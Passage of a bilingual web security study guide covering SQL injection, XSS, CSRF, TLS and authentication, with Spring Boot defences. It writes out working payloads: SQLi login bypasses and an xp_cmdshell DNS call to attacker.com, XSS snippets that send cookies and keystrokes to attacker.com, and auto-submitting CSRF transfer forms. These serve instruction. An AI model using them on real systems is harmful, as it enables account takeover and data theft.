# 🔐 Web Security — Complete Deep Dive
>
> XSS, CSRF, SQL Injection, HTTPS/TLS, OWASP Top 10, Auth Patterns

---

## 📚 Table of Contents

1. [Security Fundamentals](#1-security-fundamentals)
2. [SQL Injection — Database Attacks](#2-sql-injection--database-attacks)
3. [XSS — Cross-Site Scripting](#3-xss--cross-site-scripting)
4. [CSRF — Cross-Site Request Forgery](#4-csrf--cross-site-request-forgery)
5. [HTTPS & TLS — Mã Hóa Kết Nối](#5-https--tls--mã-hóa-kết-nối)
6. [Authentication & Authorization](#6-authentication--authorization)
7. [Password Security](#7-password-security)
8. [JWT — JSON Web Token](#8-jwt--json-web-token)
9. [OWASP Top 10 (2021)](#9-owasp-top-10-2021)
10. [Security Headers](#10-security-headers)
11. [API Security](#11-api-security)
12. [Security in Spring Boot](#12-security-in-spring-boot)

---

# 1. Security Fundamentals

## 1.1 CIA Triad — Tam Giác Bảo Mật

```
CIA TRIAD = nền tảng của information security:

  CONFIDENTIALITY (Bí mật):
    Chỉ người được phép mới xem được dữ liệu
    Attacks: eavesdropping, SQL injection, broken access control
    Defenses: encryption, access control, authentication

  INTEGRITY (Toàn vẹn):
    Dữ liệu không bị thay đổi trái phép
    Attacks: man-in-the-middle, SQL injection, XSS
    Defenses: checksums, digital signatures, input validation

  AVAILABILITY (Sẵn sàng):
    Hệ thống luôn hoạt động cho người dùng hợp pháp
    Attacks: DDoS, ransomware, resource exhaustion
    Defenses: rate limiting, CDN, load balancing, backups

ADDITIONAL (modern additions):
  Authentication: xác nhận danh tính ("bạn là ai?")
  Authorization:  quyền truy cập ("bạn được làm gì?")
  Non-repudiation: không thể phủ nhận đã thực hiện action

THREAT MODEL:
  WHO are your adversaries?       (script kiddies, nation states, insiders)
  WHAT assets do you protect?     (user data, financial data, IP)
  WHAT vulnerabilities exist?     (code bugs, misconfigurations, weak auth)
  WHAT is the impact if breached? (financial, reputational, legal)
  
  STRIDE model:
    S — Spoofing:          giả mạo identity (fake login, IP spoofing)
    T — Tampering:         thay đổi data (MITM, SQL injection)
    R — Repudiation:       phủ nhận hành động (no audit log)
    I — Information Disc:  lộ thông tin nhạy cảm (verbose errors)
    D — Denial of Service: làm hệ thống ngừng hoạt động
    E — Elevation of Priv: leo thang quyền (privilege escalation)
```

## 1.2 Attack vs Defense Mindset

```
DEFENSE IN DEPTH: nhiều lớp bảo vệ — nếu 1 lớp bị phá → lớp khác bảo vệ

  Layer 1: Network     → Firewall, WAF, DDoS protection
  Layer 2: Perimeter   → TLS, VPN, network segmentation
  Layer 3: Application → Input validation, authentication, authorization
  Layer 4: Data        → Encryption at rest, field-level encryption
  Layer 5: Monitoring  → SIEM, anomaly detection, alerting

PRINCIPLE OF LEAST PRIVILEGE:
  Mỗi user/service chỉ có quyền tối thiểu cần thiết
  DB user: chỉ SELECT/INSERT, không DROP/ALTER
  Service: chỉ read config nó cần, không đọc toàn bộ secrets

ZERO TRUST:
  "Never trust, always verify"
  Không tin tưởng bất kỳ network/user/service nào by default
  Verify mọi request, kể cả từ internal network

SECURE BY DEFAULT:
  Default config = most secure
  Phải opt-in cho less secure options
  Example: Spring Security blocks all by default
```

---

# 2. SQL Injection — Database Attacks

## 2.1 Cơ Chế SQL Injection

```
SQL INJECTION: attacker chèn SQL code vào input → thay đổi query logic

VẤN ĐỀ CỐT LÕI:
  User input được nối trực tiếp vào SQL string
  Input không được sanitize/parameterize
  Database thực thi attacker's code như legitimate SQL

CLASSIC EXAMPLE:
  URL: GET /users?id=1
  Code: "SELECT * FROM users WHERE id = " + id
  
  Normal request: id = 1
  SQL: SELECT * FROM users WHERE id = 1      ← OK
  
  Attack: id = 1 OR 1=1
  SQL: SELECT * FROM users WHERE id = 1 OR 1=1   ← returns ALL users!
  
  Attack: id = 1; DROP TABLE users; --
  SQL: SELECT * FROM users WHERE id = 1; DROP TABLE users; --
         ← xóa toàn bộ bảng users!

LOGIN BYPASS:
  Username: admin' --
  Password: anything
  
  SQL: SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'
  SQL: SELECT * FROM users WHERE username = 'admin'    ← password ignored!
  → Đăng nhập thành công mà không cần password!
  
  Username: ' OR '1'='1
  SQL: SELECT * FROM users WHERE username = '' OR '1'='1' AND password = ...
  → Luôn true, trả về user đầu tiên trong DB!
```

## 2.2 Types of SQL Injection

```
1. IN-BAND SQLi (kết quả trả về trong response):

   ERROR-BASED:
     id = 1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version())))
     → MySQL trả về error chứa database version!
     Attacker đọc DB info từ error messages

   UNION-BASED:
     id = -1 UNION SELECT username, password, 3, 4 FROM users --
     → Nối kết quả của query khác vào response
     Cần biết số columns và data types

2. BLIND SQLi (không thấy trực tiếp kết quả):

   BOOLEAN-BASED:
     id = 1 AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin') = 'a'
     → Response khác nhau nếu đúng/sai → đoán từng ký tự

   TIME-BASED:
     id = 1; IF(1=1, SLEEP(5), 0)--
     → Nếu response delay 5s → điều kiện đúng!
     Khi không có visual feedback, dùng timing

3. OUT-OF-BAND SQLi:
     id = 1; EXEC xp_cmdshell('nslookup attacker.com')
     → Gửi data ra external server qua DNS/HTTP
     Dùng khi không có response và time-based quá chậm

4. SECOND-ORDER SQLi:
     Dữ liệu được lưu vào DB (có vẻ safe)
     Sau đó được dùng trong SQL query khác
     Dangerous: dữ liệu "đáng tin" từ DB nhưng thực ra có payload

WHAT ATTACKERS CAN DO:
   Authentication bypass     → đăng nhập không cần password
   Data exfiltration         → dump toàn bộ database
   Data manipulation         → thay đổi/xóa data
   Remote code execution     → xp_cmdshell (MSSQL), load_file (MySQL)
   Denial of service         → DROP TABLE, SLEEP loops
   Privilege escalation      → tạo admin user
```

## 2.3 SQL Injection Prevention

```java
// ── NGUYÊN NHÂN: String concatenation ──

// ❌ VULNERABLE — NEVER DO THIS:
String query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'";
Statement stmt = conn.createStatement();
ResultSet rs = stmt.executeQuery(query);

// ❌ ALSO VULNERABLE — still concatenation:
String query = String.format("SELECT * FROM users WHERE id = %s", userId);

// ── FIX 1: PREPARED STATEMENTS (most important!) ──
// Tách biệt SQL code và data
// Driver sends SQL structure và data SEPARATELY to DB
// Data không thể thay đổi query structure!

// ✅ JDBC PreparedStatement:
String sql = "SELECT * FROM users WHERE username = ? AND password = ?";
PreparedStatement pstmt = conn.prepareStatement(sql);
pstmt.setString(1, username);  // safely bound, not concatenated
pstmt.setString(2, password);
ResultSet rs = pstmt.executeQuery();
// Even if username = "admin' --", it's treated as literal string!

// ✅ Spring JdbcTemplate:
String sql = "SELECT * FROM users WHERE username = ? AND password_hash = ?";
List<User> users = jdbcTemplate.query(sql,
    new Object[]{username, passwordHash},
    new UserRowMapper());

// ✅ Spring Data JPA — JPQL (not raw SQL):
@Query("SELECT u FROM User u WHERE u.username = :username AND u.status = :status")
Optional<User> findByUsernameAndStatus(
    @Param("username") String username,
    @Param("status") UserStatus status);
// Spring Data parameterizes automatically!

// ✅ Spring Data query methods (SAFEST — no SQL at all!):
Optional<User> findByUsernameAndStatus(String username, UserStatus status);
// Spring generates parameterized query automatically

// ── FIX 2: STORED PROCEDURES ──
String sql = "{call get_user_by_id(?)}";
CallableStatement cstmt = conn.prepareCall(sql);
cstmt.setLong(1, userId);

// ── FIX 3: INPUT VALIDATION ──
// Whitelist allowed characters
// Reject or sanitize suspicious input

// Validate expected formats:
if (!userId.matches("^[0-9]+$")) {
    throw new IllegalArgumentException("Invalid user ID format");
}

// For dynamic column names (can't parameterize column names!):
private static final Set<String> ALLOWED_COLUMNS = Set.of("username", "email", "created_at");

public List<User> sortUsers(String sortColumn, String direction) {
    if (!ALLOWED_COLUMNS.contains(sortColumn)) {
        throw new IllegalArgumentException("Invalid sort column");
    }
    if (!direction.equals("ASC") && !direction.equals("DESC")) {
        throw new IllegalArgumentException("Invalid sort direction");
    }
    // Now safe to use in query
    String sql = "SELECT * FROM users ORDER BY " + sortColumn + " " + direction;
    return jdbcTemplate.query(sql, new UserRowMapper());
}

// ── FIX 4: PRINCIPLE OF LEAST PRIVILEGE ──
// DB user for application:
-- CREATE USER 'appuser'@'%' IDENTIFIED BY 'strongpassword';
-- GRANT SELECT, INSERT, UPDATE ON mydb.orders TO 'appuser'@'%';
-- GRANT SELECT ON mydb.products TO 'appuser'@'%';
-- NO DELETE, NO DROP, NO ALTER!
-- Even if SQLi occurs: attacker can't drop tables or delete all data

// ── FIX 5: ERROR HANDLING ──
// ❌ Show DB errors to user (leaks DB structure!):
try {
    result = executeQuery(sql);
} catch (SQLException e) {
    return "Database error: " + e.getMessage();  // NEVER! exposes SQL!
}

// ✅ Log internally, show generic message:
try {
    result = executeQuery(sql);
} catch (SQLException e) {
    log.error("DB query failed for userId={}", userId, e);  // internal log
    throw new ServiceException("An internal error occurred");  // generic to user
}

// ── FIX 6: WAF (Web Application Firewall) ──
// AWS WAF, Cloudflare, ModSecurity
// Detect and block common SQLi patterns at network level
// NOT a replacement for parameterized queries! Defense in depth.
```

---

# 3. XSS — Cross-Site Scripting

## 3.1 Cơ Chế XSS

```
XSS: attacker chèn malicious script vào trang web
     Script chạy trong browser của VICTIM với quyền của trang web

TẠI SAO NGUY HIỂM:
  Cùng origin → script có quyền:
    - Đọc/ghi cookies (steal session tokens!)
    - Đọc form data (steal passwords!)
    - Thực hiện requests thay mặt user (CSRF bypass!)
    - Redirect user đến phishing site
    - Keylogging, screenshot
    - Modify page content (fake login form)
    - Crypto mining (sử dụng CPU của victim)

3 LOẠI XSS:

1. REFLECTED XSS (Non-persistent):
   Malicious script trong URL/request → reflected in response
   Attacker gửi link cho victim → victim click → script chạy
   
   URL: https://vulnerable.com/search?q=<script>steal_session()</script>
   Server: <h1>Results for: <script>steal_session()</script></h1>
   Browser executes the script!
   
   Phổ biến khi: search results, error messages, redirect params

2. STORED XSS (Persistent) — NGUY HIỂM NHẤT:
   Malicious script lưu trong database
   Mỗi user xem page → script chạy
   Không cần victim click link đặc biệt
   
   Comment: <script>fetch('https://attacker.com?c='+document.cookie)</script>
   Lưu vào DB, hiện lên cho mọi user xem comment đó
   Mỗi user bị steal cookies!
   Ví dụ nổi tiếng: Samy worm (MySpace 2005) — 1M victims in 20h

3. DOM-BASED XSS:
   Vulnerability trong client-side JavaScript
   Server không phải là vector — DOM manipulation là vấn đề
   
   // VULNERABLE JavaScript:
   let name = location.hash.substring(1);  // get #something from URL
   document.getElementById('welcome').innerHTML = "Hello, " + name;
   // URL: page.html#<img src=x onerror=alert(document.cookie)>
   // DOM gets manipulated with attacker's input!
```

## 3.2 XSS Attack Examples

```javascript
// ── COOKIE THEFT (most common goal) ──
<script>
  new Image().src = "https://attacker.com/steal?cookie=" + document.cookie;
  // Sends victim's session cookie to attacker!
</script>

// ── KEYLOGGER ──
<script>
  document.addEventListener('keypress', function(e) {
    fetch('https://attacker.com/keys?k=' + e.key);
  });
</script>

// ── FAKE LOGIN FORM (phishing in-page) ──
<script>
  document.body.innerHTML = '<form action="https://attacker.com/harvest" method="POST">' +
    '<input name="username" placeholder="Username"><br>' +
    '<input type="password" name="password" placeholder="Password"><br>' +
    '<button type="submit">Login</button></form>';
</script>

// ── BROWSER REDIRECT ──
<script>window.location = "https://attacker-phishing.com";</script>

// ── CSRF VIA XSS (bypass same-origin) ──
<script>
  // XSS is same origin → can make authenticated requests!
  fetch('/api/admin/create-user', {
    method: 'POST',
    credentials: 'include',  // sends cookies!
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({username: 'hacker', role: 'ADMIN'})
  });
</script>

// ── STORED XSS VIA IMAGE TAG ──
<img src="x" onerror="fetch('https://attacker.com?c='+document.cookie)">
// src=x fails → onerror fires → JavaScript executes!

// ── POLYGLOT (bypasses some filters) ──
javascript:/*--></title></style></textarea></script></xmp>
<svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(document.cookie)//'>
```

## 3.3 XSS Prevention

```java
// ── NGUYÊN TẮC: ENCODE OUTPUT! ──
// Không encode input (mất data, bypass issues)
// ENCODE khi OUTPUT vào HTML context

// ── THEMATIC ENCODING CONTEXTS ──
// HTML context:       &lt; &gt; &amp; &quot; &#x27;
// JavaScript context: \x3c \x3e \x22 (hex encode)
// URL context:        %3C %3E %22 (URL encode)
// CSS context:        \003C \003E

// ── JAVA / THYMELEAF (auto-escaping!) ──

// Thymeleaf:
// th:text escapes automatically:
<p th:text="${user.name}">name</p>
// Renders: &lt;script&gt;...&lt;/script&gt; (safe!)

// th:utext = UNESCAPED (dangerous! only for trusted content):
<p th:utext="${trustedHtml}">html</p>

// ── SPRING MVC + Jackson ──
// @ResponseBody / @RestController: Jackson serializes to JSON
// JSON encoding prevents XSS in JSON responses
// BUT: if JSON is rendered into HTML dynamically → still need to escape!

// ── OWASP Java Encoder ──
// Library cho HTML/JS/URL encoding:
import org.owasp.encoder.Encode;

String userInput = request.getParameter("name");
String safe = Encode.forHtml(userInput);          // HTML context
String safeJs = Encode.forJavaScript(userInput);  // JS context
String safeUrl = Encode.forUriComponent(userInput); // URL param
String safeCss = Encode.forCssString(userInput);   // CSS context

// Use in JSP:
<p>Hello <%= Encode.forHtml(request.getParameter("name")) %></p>

// ── CONTENT SECURITY POLICY (CSP) ──
// HTTP header that tells browser which scripts are allowed
// Even if XSS injection happens, CSP can block script execution!

// Strong CSP example:
Content-Security-Policy:
  default-src 'self';                    // only load from same origin by default
  script-src 'self' https://cdn.example.com;  // scripts only from these origins
  style-src 'self' 'nonce-{random}';    // styles need nonce
  img-src 'self' data: https:;          // images from https
  connect-src 'self' https://api.example.com; // XHR/fetch allowed targets
  frame-ancestors 'none';               // prevent clickjacking
  upgrade-insecure-requests;            // upgrade HTTP to HTTPS

// Spring Security CSP:
http.headers(headers -> headers
    .contentSecurityPolicy(csp -> csp
        .policyDirectives(
            "default-src 'self'; " +
            "script-src 'self' https://trusted-cdn.com; " +
            "style-src 'self' 'unsafe-inline'; " +
            "img-src 'self' data: https:; " +
            "frame-ancestors 'none';"
        )
    )
);

// ── HttpOnly & Secure COOKIES ──
// HttpOnly: JavaScript CANNOT access the cookie
// → Even if XSS executes, can't steal session cookie!
@Bean
public CookieSerializer cookieSerializer() {
    DefaultCookieSerializer serializer = new DefaultCookieSerializer();
    serializer.setCookieName("SESSIONID");
    serializer.setHttpOnly(true);      // JS cannot read → XSS can't steal!
    serializer.setSecure(true);        // only sent over HTTPS
    serializer.setSameSite("Strict");  // prevent CSRF
    serializer.setCookiePath("/");
    return serializer;
}

// ── INPUT SANITIZATION (for rich text/HTML content) ──
// When you MUST allow some HTML (e.g., blog editor):
// Use a whitelist-based HTML sanitizer

// OWASP AntiSamy or jsoup:
import org.jsoup.Jsoup;
import org.jsoup.safety.Safelist;

String userHtml = "<b>Hello</b> <script>evil()</script>";
String safe = Jsoup.clean(userHtml, Safelist.basic());
// Result: <b>Hello</b>  (script removed!)
// basic(): allows b, em, i, strong, u and safe attributes
// basicWithImages(): also allows img
// relaxed(): allows more tags
// NEVER use: Safelist.none() for untrusted input

// Custom safelist:
Safelist policy = Safelist.basic()
    .addTags("img", "p", "br", "h1", "h2", "h3")
    .addAttributes("img", "src", "alt", "width", "height")
    .addProtocols("img", "src", "https");  // only https images!

// ── REACT / ANGULAR (framework XSS protection) ──
// React: auto-escapes by default (JSX)
// Dangerous: dangerouslySetInnerHTML (name says it all!)
const Component = ({ userContent }) => (
  <div>{userContent}</div>    // ✅ auto-escaped
);

// ❌ DANGEROUS:
const Component = ({ html }) => (
  <div dangerouslySetInnerHTML={{ __html: html }} />  // XSS if html not sanitized!
);

// Angular: auto-escapes, [innerHTML] sanitizes
<div>{{ userContent }}</div>              // ✅ auto-escaped
<div [innerHTML]="trustedHtml"></div>     // sanitized by Angular DomSanitizer
// Angular.bypassSecurityTrustHtml() → only for truly trusted content!
```

---

# 4. CSRF — Cross-Site Request Forgery

## 4.1 Cơ Chế CSRF

```
CSRF: attacker lừa browser của victim thực hiện request
      đến legitimate site, kèm theo victim's credentials

ĐIỀU KIỆN XẢY RA:
  1. Victim đang đăng nhập vào target site (có valid session cookie)
  2. Session cookie tự động gửi theo mọi request
  3. Target site không verify request đến từ attacker hay victim

CLASSIC ATTACK:
  1. Victim login vào bank.com → gets session cookie
  2. Victim visits evil.com (attacker's site)
  3. evil.com contains:
     <img src="https://bank.com/transfer?amount=10000&to=attacker">
     Browser tự động loads img → sends GET request to bank.com
     WITH victim's session cookie!
  4. Bank.com processes transfer as if victim initiated it!

FORM-BASED CSRF:
  evil.com:
  <form action="https://bank.com/transfer" method="POST" id="steal">
    <input name="amount" value="10000">
    <input name="to" value="attacker_account">
  </form>
  <script>document.getElementById('steal').submit();</script>
  // Page auto-submits form → POST request with victim's cookie!

AJAX CSRF:
  fetch('https://bank.com/api/transfer', {
    method: 'POST',
    credentials: 'include',    // sends cookies!
    body: JSON.stringify({amount: 10000, to: 'attacker'})
  });
  // But: CORS policy may block this (same-origin policy for AJAX)
  // Simple form submissions bypass CORS!

WHAT ATTACKER CAN DO:
  Change password, email
  Transfer money
  Make purchases
  Add admin user
  Delete account
  Post content as victim
```

## 4.2 CSRF Prevention

```java
// ── CSRF TOKEN (Synchronizer Token Pattern) ──
// Server generates random token per session
// Token included in forms / headers
// Server validates token on every state-changing request
// Attacker can't read token from different origin → can't forge request!

// Spring Security CSRF (ENABLED BY DEFAULT for web apps!):
@Configuration
@EnableWebSecurity
public class SecurityConfig {

    @Bean
    SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            // CSRF enabled by default for traditional web apps:
            .csrf(csrf -> csrf
                .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
                // Stores token in cookie (JavaScript can read it)
                // JavaScript must include it in header
                // Attacker from different origin can't read cookie
            )
            // OR for REST APIs with stateless JWT:
            .csrf(AbstractHttpConfigurer::disable)  // safe if using JWT + SameSite cookies
        ;
        return http.build();
    }
}

// THYMELEAF: auto-includes CSRF token in forms!
<form action="/transfer" method="post">
    <!-- Thymeleaf automatically adds: -->
    <input type="hidden" name="_csrf" th:value="${_csrf.token}">
    <!-- Other fields -->
    <button type="submit">Transfer</button>
</form>

// AJAX với CSRF token:
// 1. Get token from meta tag or cookie:
const csrfToken = document.querySelector("meta[name='_csrf']").getAttribute("content");
const csrfHeader = document.querySelector("meta[name='_csrf_header']").getAttribute("content");

// 2. Include in AJAX request:
fetch('/api/transfer', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        [csrfHeader]: csrfToken  // X-CSRF-TOKEN: abc123def456
    },
    body: JSON.stringify({amount: 100, to: 'friend'})
});

// HTML meta tags to expose token:
<meta name="_csrf" th:content="${_csrf.token}"/>
<meta name="_csrf_header" th:content="${_csrf.headerName}"/>

// ── SAMESITE COOKIES (Modern, simpler approach) ──
// SameSite=Strict: cookie NOT sent on cross-site requests AT ALL
// SameSite=Lax:    cookie sent on top-level navigation (clicking links), NOT on embedded content
// SameSite=None:   cookie sent always (must be Secure too)

// Spring Boot:
server.servlet.session.cookie.same-site=strict  # or lax

// Manual cookie:
ResponseCookie cookie = ResponseCookie.from("SESSIONID", sessionId)
    .httpOnly(true)
    .secure(true)
    .sameSite("Strict")   // ← CSRF prevention!
    .path("/")
    .maxAge(Duration.ofHours(1))
    .build();
response.addHeader(HttpHeaders.SET_COOKIE, cookie.toString());

// SameSite=Strict:
//   User clicks link from Google → request to bank.com
//   Browser does NOT include session cookie! (cross-site navigation)
//   Only included when navigating directly or from bank.com itself
//   Problem: breaks some legitimate cross-site flows (OAuth callbacks)

// SameSite=Lax (better balance):
//   GET navigation from external: cookie SENT (user intentionally navigated)
//   POST from external form: cookie NOT SENT (prevents CSRF!)
//   Embedded images/iframes: cookie NOT SENT

// ── ORIGIN / REFERER VERIFICATION ──
// Check that request comes from same origin
// NOT sufficient alone (can be spoofed in some scenarios)

@Component
public class CsrfRefererFilter extends OncePerRequestFilter {
    
    @Override
    protected void doFilterInternal(HttpServletRequest request,
                                     HttpServletResponse response,
                                     FilterChain chain) throws IOException, ServletException {
        if (isStateChangingRequest(request)) {
            String origin  = request.getHeader("Origin");
            String referer = request.getHeader("Referer");
            
            String allowedOrigin = "https://myapp.com";
            
            if (origin != null && !origin.equals(allowedOrigin)) {
                response.sendError(403, "Invalid origin");
                return;
            }
            if (origin == null && referer != null && !referer.startsWith(allowedOrigin)) {
                response.sendError(403, "Invalid referer");
                return;
            }
        }
        chain.doFilter(request, response);
    }
    
    private boolean isStateChangingRequest(HttpServletRequest req) {
        String method = req.getMethod();
        return "POST".equals(method) || "PUT".equals(method) ||
               "DELETE".equals(method) || "PATCH".equals(method);
    }
}

// ── DOUBLE SUBMIT COOKIE ──
// Cookie value === Form/Header value
// Attacker can't set cookie for different domain
// Server just checks: cookie token == submitted token
// (Simpler than server-side session storage of token)
```

---

# 5. HTTPS & TLS — Mã Hóa Kết Nối

## 5.1 TLS Handshake — Cơ Chế Chi Tiết

```
HTTP vs HTTPS:
  HTTP:   plaintext → bất kỳ ai giữa client và server đều đọc được!
  HTTPS:  encrypted → chỉ client và server đọc được
  
  HTTPS = HTTP over TLS (Transport Layer Security)
  TLS = successor to SSL (don't say SSL anymore — outdated and broken)

TLS 1.3 HANDSHAKE (modern, simplified):

Client                                    Server
  │                                          │
  │──── ClientHello ─────────────────────▶  │
  │     (supported TLS versions,             │
  │      cipher suites,                      │
  │      key_share: client's DH public key)  │
  │                                          │
  │  ◀─── ServerHello ───────────────────── │
  │       (chosen cipher suite,              │
  │        key_share: server's DH public key,│
  │        encrypted extensions,             │
  │        CERTIFICATE,                      │
  │        CertificateVerify signature,      │
  │        Finished)                         │
  │                                          │
  │ Both sides compute: shared secret =      │
  │   ECDH(client_private, server_public)    │
  │ = ECDH(server_private, client_public)    │
  │ (Diffie-Hellman magic!)                  │
  │                                          │
  │──── {Finished} encrypted ────────────▶  │
  │                                          │
  │◀═══════ ENCRYPTED APPLICATION DATA ════▶│

KEY CONCEPTS:
  Asymmetric crypto: server's certificate (public key) → prove identity
  Symmetric crypto:  session keys derived from DH → encrypt actual data
  
  WHY DH (Diffie-Hellman)?
    Perfect Forward Secrecy: even if server's private key leaked later,
    past sessions CANNOT be decrypted (ephemeral session keys)

TLS 1.3 improvements over 1.2:
  Fewer round trips: 1-RTT (vs 2-RTT in TLS 1.2)
  0-RTT resumption: send data in first flight (for returning clients)
  Removed weak cipher suites: no more RSA key exchange, RC4, DES
  Mandatory perfect forward secrecy
  Encrypted certificates (privacy improvement)

CERTIFICATES:
  X.509 certificate contains:
    Subject: CN=example.com, O=Example Corp
    Issuer: CN=Let's Encrypt R3 (Certificate Authority)
    Public Key: (RSA/EC public key)
    Valid From/To: 2025-01-01 to 2025-04-01
    Subject Alternative Names: example.com, www.example.com, api.example.com
    Signature: CA's digital signature
  
  Browser verifies:
    1. Certificate signed by trusted CA (browser has CA root certs built in)
    2. CN/SAN matches requested hostname
    3. Certificate not expired
    4. Certificate not revoked (OCSP/CRL)
```

## 5.2 HTTPS Implementation

```java
// ── SPRING BOOT TLS CONFIG ──

# application.yml:
server:
  port: 443
  ssl:
    enabled: true
    key-store: classpath:keystore.p12
    key-store-password: ${SSL_KEYSTORE_PASSWORD}
    key-store-type: PKCS12
    key-alias: myapp
    protocol: TLS
    enabled-protocols:
      - TLSv1.3
      - TLSv1.2        # backward compat (remove if only TLS 1.3 needed)
    ciphers:
      - TLS_AES_256_GCM_SHA384           # TLS 1.3
      - TLS_AES_128_GCM_SHA256           # TLS 1.3
      - TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384  # TLS 1.2
      - TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256  # TLS 1.2

// ── REDIRECT HTTP TO HTTPS ──
@Configuration
public class HttpsRedirectConfig {

    @Bean
    public ServletWebServerFactory servletContainer() {
        TomcatServletWebServerFactory tomcat = new TomcatServletWebServerFactory() {
            @Override
            protected void postProcessContext(Context context) {
                SecurityConstraint securityConstraint = new SecurityConstraint();
                securityConstraint.setUserConstraint("CONFIDENTIAL");
                SecurityCollection collection = new SecurityCollection();
                collection.addPattern("/*");
                securityConstraint.addCollection(collection);
                context.addConstraint(securityConstraint);
            }
        };
        tomcat.addAdditionalTomcatConnectors(httpConnector());
        return tomcat;
    }

    private Connector httpConnector() {
        Connector connector = new Connector(TomcatServletWebServerFactory.DEFAULT_PROTOCOL);
        connector.setScheme("http");
        connector.setPort(8080);
        connector.setSecure(false);
        connector.setRedirectPort(8443);
        return connector;
    }
}

// ── HSTS (HTTP Strict Transport Security) ──
// Tell browser: always use HTTPS, never HTTP, for next N seconds
// Even if user types http:// → browser redirects to https:// locally!
http.headers(headers -> headers
    .httpStrictTransportSecurity(hsts -> hsts
        .includeSubDomains(true)
        .maxAgeInSeconds(31536000)   // 1 year
        .preload(true)               // submit to HSTS preload list
    )
);
// Response header: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

// ── CERTIFICATE PINNING (mobile apps) ──
// Hardcode expected certificate/public key hash in app
// Even if CA is compromised → app rejects wrong cert
OkHttpClient client = new OkHttpClient.Builder()
    .certificatePinner(new CertificatePinner.Builder()
        .add("api.example.com",
             "sha256/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=")  // cert hash
        .build())
    .build();
// Be careful: cert rotation breaks the app if pin not updated!

// ── LET'S ENCRYPT (free HTTPS) ──
// Certbot: automatically get and renew certificates
// certbot --nginx -d example.com -d www.example.com
// certbot renew --quiet (cron job)
// Certificates auto-renewed every 90 days!
```

## 5.3 Common TLS Vulnerabilities

```
POODLE (CVE-2014-3566):
  SSL 3.0 padding oracle attack
  Fix: disable SSL 3.0 (use TLS only)

BEAST (CVE-2011-3389):
  TLS 1.0 CBC block cipher attack
  Fix: upgrade to TLS 1.2+, use GCM ciphers

HEARTBLEED (CVE-2014-0160):
  OpenSSL buffer over-read
  Server's private key could be extracted!
  Fix: patch OpenSSL, revoke/reissue certificates

LOGJAM (CVE-2015-4000):
  Weak DHE parameters (512-bit)
  Fix: use 2048+ bit DH params, prefer ECDHE

SWEET32:
  3DES 64-bit block cipher birthday attack
  Fix: disable 3DES cipher suites

MITM (Man-in-the-Middle):
  Attacker intercepts encrypted traffic
  Possible if: certificate pinning bypassed, CA compromised
  Defenses: certificate pinning, HSTS, HPKP (deprecated)

TOOLS TO TEST TLS CONFIG:
  https://ssllabs.com/ssltest/     (web-based, gives A/B/C/F rating)
  testssl.sh                       (command line, comprehensive)
  nmap --script ssl-enum-ciphers   (port scan + cipher check)
  openssl s_client -connect example.com:443 -tls1_3
```

---

# 6. Authentication & Authorization

## 6.1 Authentication Schemes

```java
// ── SESSION-BASED AUTH (traditional web) ──
// 1. User logs in → server creates session in DB/Redis
// 2. Server sends Set-Cookie: SESSIONID=abc123
// 3. Browser sends cookie with every request
// 4. Server looks up session by ID → identifies user

// PROS: simple, easy to invalidate, no state in token
// CONS: stateful → hard to scale (need shared session store)

// ── TOKEN-BASED AUTH (REST APIs, mobile) ──
// 1. User logs in → server issues JWT token
// 2. Client stores token (localStorage or HttpOnly cookie)
// 3. Client sends token in header: Authorization: Bearer <token>
// 4. Server validates token signature → no DB lookup needed!

// PROS: stateless → scales horizontally, good for microservices
// CONS: can't invalidate token before expiry (use short expiry + refresh tokens)

// ── OAuth 2.0 / OIDC (third-party auth) ──
// "Login with Google/GitHub/Facebook"
// Delegate authentication to trusted provider

// PKCE Flow (for SPAs and mobile):
// 1. App generates code_verifier (random string)
// 2. App generates code_challenge = BASE64URL(SHA256(code_verifier))
// 3. Redirect to Google: ?client_id=...&code_challenge=...&code_challenge_method=S256
// 4. Google authenticates user, redirects back with authorization_code
// 5. App exchanges code + code_verifier for tokens
// 6. Google verifies: SHA256(code_verifier) == stored code_challenge
// → Authorization code alone is useless (needs verifier)!

// Spring Security OAuth2 Client:
spring:
  security:
    oauth2:
      client:
        registration:
          google:
            client-id: ${GOOGLE_CLIENT_ID}
            client-secret: ${GOOGLE_CLIENT_SECRET}
            scope: openid,profile,email
        provider:
          google:
            authorization-uri: https://accounts.google.com/o/oauth2/v2/auth
            token-uri: https://oauth2.googleapis.com/token
            user-info-uri: https://www.googleapis.com/oauth2/v3/userinfo
            jwk-set-uri: https://www.googleapis.com/oauth2/v3/certs
```

## 6.2 Authorization Patterns

```java
// ── RBAC (Role-Based Access Control) ──
// Users have roles, roles have permissions
// Simple, widely used

@PreAuthorize("hasRole('ADMIN')")
public void deleteUser(Long id) { ... }

@PreAuthorize("hasAnyRole('ADMIN', 'MODERATOR')")
public void banUser(Long id) { ... }

@PreAuthorize("hasAuthority('user:write')")
public User updateUser(Long id, UserUpdate update) { ... }

// ── ABAC (Attribute-Based Access Control) ──
// Access based on attributes of user, resource, environment
// More flexible than RBAC

@PreAuthorize("@orderSecurity.canAccess(#orderId, authentication)")
public Order getOrder(Long orderId) { ... }

@Component("orderSecurity")
public class OrderSecurity {
    public boolean canAccess(Long orderId, Authentication auth) {
        UserDetails user = (UserDetails) auth.getPrincipal();
        Order order = orderRepository.findById(orderId).orElseThrow();
        
        // Admin: access all orders
        if (user.getAuthorities().contains(new SimpleGrantedAuthority("ROLE_ADMIN")))
            return true;
        
        // User: only their own orders
        return order.getUserId().equals(((AppUser)user).getId());
    }
}

// ── METHOD-LEVEL SECURITY ──
@EnableMethodSecurity(prePostEnabled = true, securedEnabled = true)

@PostAuthorize("returnObject.userId == authentication.principal.id")
public Order getOrder(Long id) {
    return orderRepository.findById(id).orElseThrow();
    // Check AFTER method returns! (for field-level check)
}

@PostFilter("filterObject.userId == authentication.principal.id")
public List<Order> getAllOrders() {
    return orderRepository.findAll();
